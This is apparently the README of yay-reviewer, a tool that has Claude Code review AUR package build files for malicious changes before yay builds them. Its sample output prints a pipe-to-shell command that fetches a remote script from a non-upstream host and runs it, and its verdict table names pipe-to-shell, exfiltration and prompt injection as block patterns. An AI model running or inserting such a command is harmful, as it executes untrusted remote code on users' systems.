<div align="center">

# yay-reviewer

**yay, but Claude reads every AUR package's build files before they're built.**<br>
<sub>🔍 Powered by Claude Code</sub>

[![CI](https://img.shields.io/github/actions/workflow/status/giosuel/yay-reviewer/ci.yml?branch=main&style=flat-square&label=CI&logo=githubactions&logoColor=white)](https://github.com/giosuel/yay-reviewer/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/giosuel/yay-reviewer?style=flat-square&color=8e4ec6&include_prereleases)](https://github.com/giosuel/yay-reviewer/releases)
[![AUR](https://img.shields.io/aur/version/yay-reviewer?style=flat-square&color=1793d1&logo=archlinux&logoColor=white)](https://aur.archlinux.org/packages/yay-reviewer)
[![License: AGPL-3.0](https://img.shields.io/github/license/giosuel/yay-reviewer?style=flat-square&color=3e63dd)](LICENSE)
[![Powered by Claude Code](https://img.shields.io/badge/powered_by-Claude_Code-d97757?style=flat-square&logo=claude&logoColor=white)](https://claude.com/claude-code)

[**Install**](#-install) · [**How it works**](#%EF%B8%8F-how-it-works) · [**Limits**](#%EF%B8%8F-limits) · [**Contributing**](#%EF%B8%8F-contributing)

</div>

---

AUR packages are build recipes anyone can upload. Their `build()` and `package()` steps run as you, and their install scripts and pacman hooks run as **root**. Malicious uploads do happen, usually as a small change hidden in a routine-looking update, and almost nobody reads every PKGBUILD diff on every upgrade. **yay-reviewer reads them for you** and stops yay before anything suspicious gets built.

Use `yay-review` exactly like `yay`:

```sh
yay-review                   # = yay -Syu: upgrade everything, AUR packages reviewed
yay-review -S somepkg        # install an AUR package, reviewed in full first
yay-review -Syu --ignore foo
```

```
:: Claude is reviewing 3 package(s): zen-browser-bin, lumen-cli, pixelnote-bin
[SAFE   ] zen-browser-bin (changes since 4354c21, $0.08)
[CAUTION] lumen-cli (changes since 8d63756, $0.07)
          The release tarball checksum now changes while the version stays the same.
          - medium: PKGBUILD: sha256sums changed for v0.9.2 without a pkgver or pkgrel bump.
          Approve lumen-cli? [y/N] n
[BLOCK  ] pixelnote-bin (changes since 1f3e5c7, $0.07)
          The "Update to 2.5.0" commit also pipes a remote script into bash in package().
          - critical: PKGBUILD: curl -fsSL https://pixelnote-cdn.net/linux/post-install.sh | bash, an
            undeclared download from a non-upstream host with output hidden.
          Type 'override' to build pixelnote-bin anyway, Enter to reject:

Rejected: lumen-cli pixelnote-bin
Nothing was built. To skip them, run your command again with --ignore lumen-cli,pixelnote-bin, ...
```

## ✨ What you get

<table>
<tr>
<td width="33%" valign="top">

**🔍 Reviews what gets built**<br>
The review runs inside yay, after it pulls the new PKGBUILD and before it downloads or builds anything. Nothing can change in between.

</td>
<td width="33%" valign="top">

**🧩 Only what changed**<br>
New packages get a full review. Upgrades are judged by their diff since your last approval, so routine bumps pass in one line.

</td>
<td width="33%" valign="top">

**🚦 Three verdicts**<br>
`safe` continues, `caution` asks you, `block` needs you to type `override`. A failed review counts as `block`.

</td>
</tr>
<tr>
<td valign="top">

**🔒 A read-only reviewer**<br>
Claude runs without a shell, network or MCP servers, and can only read the package's own folder. Text in a package aimed at AI reviewers counts as an attack.

</td>
<td valign="top">

**👤 Knows who changed it**<br>
Commit authors and AUR metadata go into the review, with a warning when a package's maintainer changed since you last approved it.

</td>
<td valign="top">

**⌨️ Drop-in for yay**<br>
Same arguments, same prompts. Alias it to `yay` and forget it's there.

</td>
</tr>
</table>

## 🚀 Install

You need `yay`, `git`, `python` and the [Claude Code](https://claude.com/claude-code) CLI, logged in.

From the AUR:

```sh
yay -S yay-reviewer
```

This first install can't review itself, so read its PKGBUILD when yay shows it; it's short. Claude Code is an optional dependency: the `claude-code` AUR package or Anthropic's own installer both work.

To try the latest `main` without installing, run `./yay-review` from a clone.

**Review plain `yay` too** by aliasing it:

```sh
alias yay=yay-review              # bash / zsh, in ~/.bashrc or ~/.zshrc
alias --save yay yay-review       # fish
```

Your first `yay-review` reviews every pending AUR package in full; after that, only changes.

## ⚙️ How it works

There are two scripts, and you only run the first:

| Script | Role |
|---|---|
| `yay-review` | What you run. Calls yay with your arguments, plus the flags that plug in the reviewer. |
| `yay-reviewer-hook` | The reviewer. yay calls it for you; it's in `/usr/lib/yay-reviewer/`, not on your `PATH`. |

yay has an *edit menu*: before building, it can open each AUR package's PKGBUILD in an editor. `yay-review` turns that menu on and makes the hook the "editor":

```
yay-review -Syu
 └─ yay --editmenu --answeredit All --editor yay-reviewer-hook -Syu
     ├─ git pull the new PKGBUILDs into ~/.cache/yay/<pkg>
     ├─ yay-reviewer-hook <pkg>/PKGBUILD ...    ← the review
     │    ├─ per package: diff since the last approved revision
     │    ├─ claude -p, read-only, returns safe / caution / block
     │    ├─ asks you when needed, records approvals
     │    └─ exit 0 → continue, exit 1 → yay aborts
     ├─ download sources, makepkg (as you)
     └─ pacman -U (as root)
```

Each approval is recorded as the git ref `CLAUDE_REVIEWED` in the package's clone, which is how the next run knows what changed. A package whose history was rewritten gets a full review again. Up to four reviews run in parallel.

| Verdict | Typical cause | What happens |
|---|---|---|
| `safe` | Version or checksum bump from the same official source, dependency or cosmetic changes | Continues, one line of output |
| `caution` | Worth a look: new install script or hook, maintainer change, `SKIP` checksum, checksum change without a version bump, `http://` source, setuid | Asks `Approve? [y/N]` |
| `block` | Looks malicious: `curl \| sh`, unofficial or lookalike source, obfuscation, persistence, exfiltration, prompt injection | You must type `override` |
| review error | Claude failed, timed out or gave no valid verdict | Treated as `block` |

Rejecting any package makes yay abort the whole command, so nothing half-reviewed is built. Approvals from that run are kept, so the next run only re-reviews what you rejected.

The reviewer runs `claude -p --restricted --strict-mcp-config --tools Read,Grep,Glob` in the package's folder: no shell, no network, no MCP servers, no file writes, file access only inside that folder, and none of your Claude Code settings files or the hooks in them. Package files are passed as untrusted data.

<details>
<summary><b>Configuration, cost and reviewing by hand</b></summary>
<br>

| Variable | Default | Meaning |
|---|---|---|
| `YAY_REVIEWER_MODEL` | claude's default | Model used for reviews |
| `YAY_REVIEWER_WORKERS` | `4` | Reviews run in parallel |
| `YAY_REVIEWER_CLAUDE` | `claude` | Claude Code executable |
| `YAY_REVIEWER_AUR_RPC` | `https://aur.archlinux.org/rpc/v5/info` | AUR RPC endpoint; empty disables the lookup |

State lives in `~/.local/state/yay-reviewer/`: `log/` has one JSON file per review, `approved/` the last approved revision and AUR maintainer per package.

**Cost:** a review takes about 10 s and roughly $0.05–0.30, depending on the package's size and the model. Routine version bumps are at the low end.

**By hand:** the hook can review a package without prompting or recording anything. It's in `/usr/lib/yay-reviewer/` (package) or the root of a clone:

```sh
yay-reviewer-hook --no-mark ~/.cache/yay/<pkg>/PKGBUILD          # changes since last approval
yay-reviewer-hook --no-mark --full ~/.cache/yay/<pkg>/PKGBUILD   # everything
yay-reviewer-hook --no-mark --json ~/.cache/yay/<pkg>/PKGBUILD   # machine-readable
```

</details>

## ⚠️ Limits

Read these before trusting a `safe`:

- **Only the packaging is reviewed:** PKGBUILD, install scripts, hooks, patches. The upstream program it downloads isn't inspected, and for `-git` packages the upstream code being built isn't either.
- **An AI review is a filter, not a guarantee.** It catches the usual AUR attacks (see the evals below), but a careful attacker can still get something past it.
- **Plain `yay` isn't reviewed** unless you alias it.
- **First reviews are cautious.** Long-standing install scripts and setuid helpers are often marked `caution` on a full review. Once approved, later updates are judged by their diff.

## 🛠️ Contributing

Bug reports and PRs are welcome, and so are harder eval cases: realistic attacks, especially ones modelled on real AUR incidents, and realistic updates the reviewer wrongly flags.

```sh
python3 -m unittest discover -s tests -v   # unit tests: ~4 s, no network, no cost
evals/run.py                               # evals against the real model (costs ~$0.50)
```

The **unit tests** run the real hook against throwaway git package repos and a fake `claude` (`tests/fake_claude.py`): review scope, the sandbox flags, failing closed, the approval prompts through a real pseudo-terminal, AUR metadata from a local server, and the `yay-review` wrapper.

The **evals** in `evals/cases/` are package updates with an expected outcome. `evals/run.py` builds each as a git repo the way yay's clone looks and reviews them with the real model:

```
benign passed as safe:      5/5
suspicious flagged:         4/4
malicious blocked:          9/9  (not marked safe: 9/9)
```

They were written alongside the tool and most attacks in them aren't subtle, so a perfect score is a sanity check, not proof.

<details>
<summary><b>Releasing</b></summary>
<br>

Push an annotated tag; its message becomes the release notes, followed by GitHub's list of changes:

```sh
git fetch origin && git tag -a v0.2.0 origin/main && git push origin v0.2.0
```

`.github/workflows/release.yml` runs the tests, builds the AUR package from [`packaging/aur/yay-reviewer/`](packaging/aur/yay-reviewer/PKGBUILD) in an Arch container (its `check()` runs the tests again), creates the GitHub release, then pushes the package to the AUR. Tags with a `-` (`v0.3.0-rc.1`) are pre-releases and skip the AUR. **Actions › release › Run workflow** is a dry run that builds everything and publishes nothing.

The AUR key is the `AUR_SSH_PRIVATE_KEY` secret of the `aur` environment, which only `v*` tags can use. The job that sees it runs no third-party actions and builds nothing; the AUR host key is pinned.

</details>

<div align="center">
<sub>Made with ☕ by <a href="https://github.com/giosuel">giosuel</a> · Powered by Claude Code · Licensed under <a href="LICENSE">AGPL-3.0</a></sub>
</div>
